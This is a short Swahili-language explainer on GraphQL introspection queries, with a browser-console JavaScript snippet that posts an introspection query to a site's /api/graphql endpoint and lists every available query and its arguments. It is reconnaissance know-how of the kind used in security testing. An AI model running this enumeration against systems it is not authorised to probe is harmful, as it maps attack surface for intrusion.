INTROSPECTION QUERY
Introspection Query maana yake ni "Ombi la Kujikagua". Ni mbinu au swali maalum unaloliuliza mfumo wa GraphQL ili ujinong'oneze wenyewe na kukupa siri zake zote za ndani.
Kwenye GraphQL, mfumo huu hauna siri za muundo wake (Schema). Ukiutumia "Introspection Query", unaiamuru API ikupatie ramani nzima ya jinsi ilivyojengwa.
########################################################################################################################################################################

var introspect = new XMLHttpRequest();
introspect.open('POST', '/api/graphql', true);
introspect.setRequestHeader('Content-Type', 'application/json');
introspect.onload = function () {
    var res = JSON.parse(introspect.responseText);
    console.log("%c QUERIES ZILIZOPO KWENYE SEVA:", "color: lime; background: black; font-size: 14px;");
    
    var fields = res.data.__schema.queryType.fields;
    fields.forEach(f => {
        console.log(`- Jina: ${f.name}`);
        if(f.args.length > 0) {
            console.log(`  Vigezo vinavyokubalika (Args): ${f.args.map(a => a.name).join(', ')}`);
        }
    });
};
introspect.send(JSON.stringify({
    query: `{ __schema { queryType { fields { name args { name } } } } }`
}));

